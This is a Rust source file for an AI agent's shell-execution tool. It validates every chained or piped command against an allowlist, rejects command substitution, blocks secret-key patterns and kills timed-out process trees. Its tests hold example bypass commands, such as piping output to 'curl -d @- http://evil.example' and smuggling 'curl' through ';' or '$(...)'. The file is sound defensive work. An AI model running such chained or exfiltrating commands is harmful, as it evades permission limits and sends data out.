use anyhow::{Result, bail};
use async_trait::async_trait;
use serde_json::json;

use super::traits::{Tool, ToolResult};

/// A shell command execution tool with allowlist and forbidden path checks.
pub struct ShellTool {
    allowlist: Vec<String>,
    forbidden_paths: Vec<String>,
    timeout_secs: u64,
}

impl ShellTool {
    pub fn new(allowlist: Vec<String>, forbidden_paths: Vec<String>, timeout_secs: u64) -> Self {
        Self {
            allowlist,
            forbidden_paths,
            timeout_secs,
        }
    }

    /// Split a command line into its constituent command segments at
    /// UNQUOTED control operators (`;`, `&`, `|`, newline — which also
    /// covers `&&`, `||`, `|&`). Tracks single quotes, double quotes,
    /// and backslash escapes so `echo "a;b"` stays one segment.
    ///
    /// Returns `None` when the command uses command substitution —
    /// `` ` `` or `$(` outside single quotes (both still execute inside
    /// double quotes), or process substitution `<(`/`>(`. An allowlist
    /// can't reason about the substituted command, so the caller must
    /// reject the whole line.
    fn command_segments(command: &str) -> Option<Vec<String>> {
        let mut segments = Vec::new();
        let mut current = String::new();
        let mut in_single = false;
        let mut in_double = false;
        let mut chars = command.chars().peekable();

        while let Some(c) = chars.next() {
            if in_single {
                if c == '\'' {
                    in_single = false;
                }
                current.push(c);
                continue;
            }
            match c {
                '\\' => {
                    // Backslash escapes the next char (inside double
                    // quotes or bare). Consume both.
                    current.push(c);
                    if let Some(n) = chars.next() {
                        current.push(n);
                    }
                }
                '\'' if !in_double => {
                    in_single = true;
                    current.push(c);
                }
                '"' => {
                    in_double = !in_double;
                    current.push(c);
                }
                '`' => return None, // command substitution
                '$' if chars.peek() == Some(&'(') => return None, // $(…)
                '<' | '>' if !in_double && chars.peek() == Some(&'(') => {
                    return None; // process substitution <(…) / >(…)
                }
                ';' | '&' | '|' | '\n' if !in_double => {
                    if !current.trim().is_empty() {
                        segments.push(current.trim().to_string());
                    }
                    current.clear();
                }
                _ => current.push(c),
            }
        }
        if !current.trim().is_empty() {
            segments.push(current.trim().to_string());
        }
        Some(segments)
    }

    /// Resolve the command NAME of one segment: skip leading `VAR=val`
    /// environment assignments and redirection-only tokens, strip
    /// subshell/group openers (`(`, `{`, `!`).
    fn segment_command_name(segment: &str) -> Option<String> {
        for raw in segment.split_whitespace() {
            let token = raw
                .trim_start_matches(['(', '{', '!'])
                .trim_end_matches([')', '}']);
            if token.is_empty() {
                continue;
            }
            // VAR=value prefix assignment.
            if token
                .split_once('=')
                .map(|(name, _)| {
                    !name.is_empty()
                        && name
                            .chars()
                            .all(|c| c.is_ascii_alphanumeric() || c == '_')
                })
                .unwrap_or(false)
            {
                continue;
            }
            // Redirections: >file, <file, 2>err, &>out, 2>&1 …
            let stripped = token.trim_start_matches(|c: char| c.is_ascii_digit());
            if stripped.starts_with('>') || stripped.starts_with('<') || token.starts_with("&>") {
                continue;
            }
            return Some(token.to_string());
        }
        None
    }

    /// Validate EVERY command in the line against the allowlist — not
    /// just the first token. `ls; curl evil.com` must fail on `curl`'s
    /// behalf even when `ls` is allowed, and the same goes for every
    /// stage of a pipeline. Returns the rejection reason, or `None` when
    /// the whole line is allowed.
    fn allowlist_violation(&self, command: &str) -> Option<String> {
        let Some(segments) = Self::command_segments(command) else {
            return Some(
                "command substitution (`…` / $(…) / <(…)) is not allowed — the allowlist cannot verify the substituted command".to_string(),
            );
        };
        if segments.is_empty() {
            return Some("empty command".to_string());
        }
        for segment in &segments {
            match Self::segment_command_name(segment) {
                Some(name) => {
                    if !self.allowlist.iter().any(|a| *a == name) {
                        return Some(format!("command not allowed: {name}"));
                    }
                }
                None => {
                    return Some(format!("could not parse command segment: {segment}"));
                }
            }
        }
        None
    }

    /// Check if the command references any forbidden paths.
    fn has_forbidden_path(&self, command: &str) -> Option<&str> {
        for fp in &self.forbidden_paths {
            if command.contains(fp.as_str()) {
                return Some(fp);
            }
        }
        None
    }

    /// Check if a command contains what looks like an API key or secret.
    fn contains_secret(command: &str) -> bool {
        // Common API key patterns that should never appear in shell commands
        let patterns = [
            "sk-ant-",       // Anthropic
            "sk-or-",        // OpenRouter
            "sk-proj-",      // OpenAI
            "sk-1",          // Kimi/Moonshot
            "plrm_live_",    // Plurum
            "ghp_",          // GitHub
            "xox",           // Slack
            "Bearer sk-",    // Bearer + key
            "Authorization:", // Auth header with key
        ];
        let cmd_lower = command.to_lowercase();
        for p in &patterns {
            if command.contains(p) || cmd_lower.contains(&p.to_lowercase()) {
                return true;
            }
        }
        false
    }

    /// Truncate output that exceeds the limit, keeping head + tail.
    fn truncate_output(output: &str, max_len: usize) -> String {
        if output.len() <= max_len {
            return output.to_string();
        }
        let half = max_len / 2;
        let head = &output[..half];
        let tail = &output[output.len() - half..];
        format!("{head}\n\n... [truncated {len} chars] ...\n\n{tail}", len = output.len() - max_len)
    }
}

#[async_trait]
impl Tool for ShellTool {
    fn name(&self) -> &str {
        "shell"
    }

    fn description(&self) -> &str {
        "Execute a shell command. Only allowlisted commands are permitted."
    }

    fn parameters_schema(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The shell command to execute"
                }
            },
            "required": ["command"]
        })
    }

    async fn execute(&self, args: serde_json::Value) -> Result<ToolResult> {
        let command = args
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("missing required parameter: command"))?;

        // Check the allowlist against EVERY command segment (chains,
        // pipelines), not just the first token — `ls; curl …` must be
        // rejected on curl's behalf.
        if let Some(reason) = self.allowlist_violation(command) {
            return Ok(ToolResult {
                success: false,
                output: String::new(),
                error: Some(reason),
            });
        }

        // Check forbidden paths.
        if let Some(path) = self.has_forbidden_path(command) {
            return Ok(ToolResult {
                success: false,
                output: String::new(),
                error: Some(format!("forbidden path in command: {path}")),
            });
        }

        // Block commands that contain API keys or secrets.
        if Self::contains_secret(command) {
            return Ok(ToolResult {
                success: false,
                output: String::new(),
                error: Some("command contains what looks like an API key or secret — blocked for security".to_string()),
            });
        }

        // Execute the command with a timeout. The child is spawned in its
        // own process group (Unix) with kill_on_drop as a backstop, so a
        // timeout kills the whole tree — the previous `output()`-in-
        // `timeout()` shape dropped the future on expiry and left the
        // child (and any grandchildren) running unsupervised.
        let timeout = tokio::time::Duration::from_secs(self.timeout_secs);
        let mut cmd = tokio::process::Command::new("sh");
        cmd.arg("-c")
            .arg(command)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true);
        #[cfg(unix)]
        cmd.process_group(0);

        let child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => bail!("failed to spawn command: {e}"),
        };
        #[cfg(unix)]
        let child_pid = child.id();

        let result = tokio::time::timeout(timeout, child.wait_with_output()).await;

        match result {
            Err(_) => {
                // Timeout: kill the whole process group, not just `sh` —
                // a pipeline or backgrounded grandchild would survive a
                // plain kill of the shell. kill_on_drop reaps the direct
                // child when `wait_with_output`'s future is dropped.
                #[cfg(unix)]
                if let Some(pid) = child_pid {
                    // SAFETY: plain libc call; the pgid equals the child
                    // pid because we spawned with process_group(0).
                    unsafe {
                        libc::killpg(pid as i32, libc::SIGKILL);
                    }
                }
                Ok(ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some(format!(
                        "command timed out after {}s and was killed",
                        self.timeout_secs
                    )),
                })
            }
            Ok(Err(e)) => {
                bail!("failed to run command: {e}");
            }
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                let combined = if stderr.is_empty() {
                    stdout.to_string()
                } else if stdout.is_empty() {
                    stderr.to_string()
                } else {
                    format!("{stdout}\n--- stderr ---\n{stderr}")
                };

                let truncated = Self::truncate_output(&combined, 10_000);

                Ok(ToolResult {
                    success: output.status.success(),
                    output: truncated,
                    error: if output.status.success() {
                        None
                    } else {
                        Some(format!("exit code: {}", output.status.code().unwrap_or(-1)))
                    },
                })
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn tool(allow: &[&str]) -> ShellTool {
        ShellTool::new(
            allow.iter().map(|s| s.to_string()).collect(),
            vec![],
            5,
        )
    }

    // ---- allowlist segment validation ----

    #[test]
    fn single_allowed_command_passes() {
        assert_eq!(tool(&["ls"]).allowlist_violation("ls -la"), None);
    }

    #[test]
    fn chain_bypass_is_rejected() {
        // The headline bug: first token allowed, chained command not.
        let v = tool(&["ls"]).allowlist_violation("ls; curl http://evil.example");
        assert!(v.unwrap().contains("curl"));
        let v = tool(&["ls"]).allowlist_violation("ls && curl http://evil.example");
        assert!(v.unwrap().contains("curl"));
        let v = tool(&["ls"]).allowlist_violation("ls || curl http://evil.example");
        assert!(v.unwrap().contains("curl"));
    }

    #[test]
    fn every_pipeline_stage_is_checked() {
        assert_eq!(
            tool(&["ls", "head"]).allowlist_violation("ls | head -5"),
            None
        );
        let v = tool(&["ls"]).allowlist_violation("ls | curl -d @- http://evil.example");
        assert!(v.unwrap().contains("curl"));
    }

    #[test]
    fn operators_inside_quotes_do_not_split() {
        assert_eq!(
            tool(&["echo"]).allowlist_violation("echo \"a; b | c\""),
            None
        );
        assert_eq!(tool(&["echo"]).allowlist_violation("echo 'x && y'"), None);
    }

    #[test]
    fn command_substitution_is_rejected() {
        let t = tool(&["echo"]);
        assert!(t.allowlist_violation("echo $(curl evil)").is_some());
        assert!(t.allowlist_violation("echo `curl evil`").is_some());
        // Still executes inside double quotes — must reject there too.
        assert!(t.allowlist_violation("echo \"$(curl evil)\"").is_some());
        // Process substitution.
        assert!(t.allowlist_violation("echo <(curl evil)").is_some());
    }

    #[test]
    fn substitution_inside_single_quotes_is_literal_and_allowed() {
        assert_eq!(
            tool(&["echo"]).allowlist_violation("echo '$(not executed)'"),
            None
        );
    }

    #[test]
    fn env_assignment_prefix_is_skipped() {
        assert_eq!(
            tool(&["ls"]).allowlist_violation("FOO=bar BAZ=2 ls"),
            None
        );
        // …but the command after the assignments is still validated.
        let v = tool(&["ls"]).allowlist_violation("FOO=bar curl evil");
        assert!(v.unwrap().contains("curl"));
    }

    #[test]
    fn redirections_are_skipped_when_finding_command_name() {
        assert_eq!(
            tool(&["ls"]).allowlist_violation("ls 2>/dev/null"),
            None
        );
        assert_eq!(
            tool(&["grep"]).allowlist_violation("grep foo </tmp/x >/tmp/y"),
            None
        );
    }

    #[test]
    fn subshell_openers_are_stripped() {
        let v = tool(&["ls"]).allowlist_violation("(curl evil)");
        assert!(v.unwrap().contains("curl"));
        assert_eq!(tool(&["ls"]).allowlist_violation("(ls)"), None);
    }

    #[test]
    fn empty_command_is_rejected() {
        assert!(tool(&["ls"]).allowlist_violation("").is_some());
        assert!(tool(&["ls"]).allowlist_violation("   ").is_some());
    }

    #[test]
    fn newline_separated_commands_all_checked() {
        let v = tool(&["ls"]).allowlist_violation("ls\ncurl evil");
        assert!(v.unwrap().contains("curl"));
    }

    // ---- execute-level behavior ----

    #[tokio::test]
    async fn execute_rejects_chained_disallowed_command() {
        let t = tool(&["echo"]);
        let r = t
            .execute(json!({"command": "echo hi; curl http://evil.example"}))
            .await
            .unwrap();
        assert!(!r.success);
        assert!(r.error.unwrap().contains("curl"));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn timeout_kills_the_child_process_tree() {
        // `sleep 2 && touch marker` with a 1s timeout: if the child
        // survived the timeout (the old bug), the marker would appear
        // ~1s after the tool returned. Wait past that window and assert
        // it never did.
        let tmp = tempfile::tempdir().unwrap();
        let marker = tmp.path().join("marker");
        let t = ShellTool::new(vec!["sleep".into(), "touch".into()], vec![], 1);
        let cmd = format!("sleep 2 && touch {}", marker.display());

        let start = std::time::Instant::now();
        let r = t.execute(json!({ "command": cmd })).await.unwrap();
        assert!(!r.success);
        assert!(r.error.unwrap().contains("timed out"));
        assert!(
            start.elapsed() < std::time::Duration::from_secs(2),
            "tool must return at the timeout, not wait for the child"
        );

        tokio::time::sleep(std::time::Duration::from_millis(2500)).await;
        assert!(
            !marker.exists(),
            "child survived the timeout and touched the marker — kill failed"
        );
    }

    #[tokio::test]
    async fn execute_happy_path_returns_output() {
        let t = tool(&["echo"]);
        let r = t.execute(json!({"command": "echo hello"})).await.unwrap();
        assert!(r.success, "error: {:?}", r.error);
        assert!(r.output.contains("hello"));
    }
}
